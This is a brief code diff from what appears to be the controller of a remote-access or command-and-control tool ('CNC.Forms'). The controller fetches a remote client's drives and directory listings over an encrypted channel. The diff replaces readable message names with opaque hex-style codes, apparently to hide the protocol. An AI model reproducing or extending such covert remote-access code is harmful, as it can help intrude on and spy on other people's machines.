@@ -34,7 +34,7 @@ namespace CNC.Forms
         {
             
             drives = JsonConvert.DeserializeObject<DriveInfo[]>(Cryptography.Decrypt(
-                currentClient.Connection.SendReceiveObject<string, string>("GetDriveInfoReq", "GetDriveInfoRep", 10000,
+                currentClient.Connection.SendReceiveObject<string, string>("0x21", "1x21", 10000,
                 Cryptography.Encrypt(Guid.NewGuid().ToString()))));
               
             driveBox.Items.Clear();
@@ -51,8 +51,8 @@ namespace CNC.Forms
             listViewCurrent.Items.Clear();
             
             FileEntry[] fe = JsonConvert.DeserializeObject<FileEntry[]>(
-                Cryptography.Decrypt(currentClient.Connection.SendReceiveObject<string, string>("GetDirectoryContentReq", 
-                "GetDirectoryContentRep", 20000, 
+                Cryptography.Decrypt(currentClient.Connection.SendReceiveObject<string, string>("0x22", 
+                "1x22", 20000, 
                 Cryptography.Encrypt(currentPath))));
 
             imgList = new ImageList();
